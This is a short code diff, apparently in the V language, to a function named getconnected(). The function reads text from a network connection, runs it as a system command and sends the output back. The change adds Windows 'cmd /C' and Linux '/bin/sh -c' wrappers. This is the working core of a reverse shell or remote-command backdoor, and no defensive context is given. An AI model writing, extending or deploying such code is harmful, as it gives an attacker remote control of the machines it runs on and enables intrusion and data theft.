@@ -9,6 +9,7 @@ fn getconnected() {
         panic(err)
     }
     mut buf := []byte{len: 1024}
+    mut args := ''
     for {
             nbytes := conn.read(mut buf) or {
                 panic(err)
@@ -16,12 +17,16 @@ fn getconnected() {
             mut received := buf[0..nbytes].bytestr()
             //println('message received:  $received') 
             received = received.replace('\r\n','')
-            res := os.exec(received) or {
+            if os.user_os() == 'windows' {
+                args = "cmd /C" + " " + received
+            } else if os.user_os() == 'linux' {
+                args = "/bin/sh -c" + " " + received
+            }
+            res := os.exec(args) or {
                 panic(err)
             }
             //println(res.output)
             conn.write_str(res.output)
-    
     }
     conn.close()
     
